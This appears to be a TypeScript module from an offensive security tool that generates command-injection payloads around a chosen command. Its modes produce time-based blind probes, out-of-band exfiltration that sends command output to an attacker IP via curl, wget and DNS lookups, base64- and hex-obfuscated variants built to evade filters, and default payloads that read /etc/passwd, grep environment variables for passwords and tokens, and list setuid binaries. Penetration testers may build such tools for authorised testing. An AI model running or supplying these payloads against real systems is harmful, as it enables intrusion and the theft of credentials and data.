export function generateSuggestions(
  mode: string | undefined,
  baseCmd = "id",
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string[] {
  const b = (baseCmd || "id").trim();
  const b64 = Buffer.from(b).toString("base64");
  const hex = Array.from(Buffer.from(b)).map(x => `\\x${x.toString(16).padStart(2,"0")}`).join("");

  if (mode === "blind") {
    return [
      `${b} && sleep 7`,
      `${b}||(sleep 9)`,
      `${b}; _t=$SECONDS; sleep 6; echo $((SECONDS-_t))`,
      `${b} & sleep 5 && wait`,
      `${b} && bash -c 'read -t 8 x'`,
      `${b}; ping -c 7 -i 1 127.0.0.1 >/dev/null`,
    ];
  }

  if (mode === "oob") {
    return [
      `${b} && curl -sk "http://${attackerIp}:${attackerPort}/?x=$(${b}|base64 -w0)"`,
      `${b} && nslookup "$(${b}|head -c20|tr -cd '[:alnum:]').${attackerIp}"`,
      `${b} && wget -qO- "http://${attackerIp}:${attackerPort}/?d=$(${b}|base64 -w0)"`,
      `${b} && curl -sk -X POST "http://${attackerIp}:${attackerPort}/" -d "$(${b})"`,
      `${b} | curl -sk -T- "http://${attackerIp}:${attackerPort}/upload"`,
    ];
  }

  if (mode === "quantum") {
    const b64full = Buffer.from(`${b} && uname -a && id`).toString("base64");
    const b64env = Buffer.from(`${b} && env`).toString("base64");
    return [
      `{echo,${b64}}|{base64,-d}|bash`,
      `bash<<<$(echo${String.fromCharCode(9)}${b64}|base64${String.fromCharCode(9)}-d)`,
      `eval "$(printf '${hex}')"`,
      `{echo,${b64full}}|{base64,-d}|{bash,}`,
      `$(printf '${hex}') && uname -a`,
      `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`,
      `_x=$(echo ${b64env}|base64 -d);eval${String.fromCharCode(9)}$_x`,
    ];
  }

  return [
    `${b} && ls -la /`,
    `${b}; cat /etc/passwd`,
    `${b} && uname -a && hostname`,
    `${b} && env | grep -iE 'pass|key|secret|token'`,
    `${b} && find / -perm -4000 -type f 2>/dev/null | head -5`,
    `${b} && cat /proc/self/environ | tr '\\0' '\\n'`,
    `${b} && ss -tulpn 2>/dev/null`,
    `${b} && nc -zv ${attackerIp} ${attackerPort} 2>&1`,
  ];
}
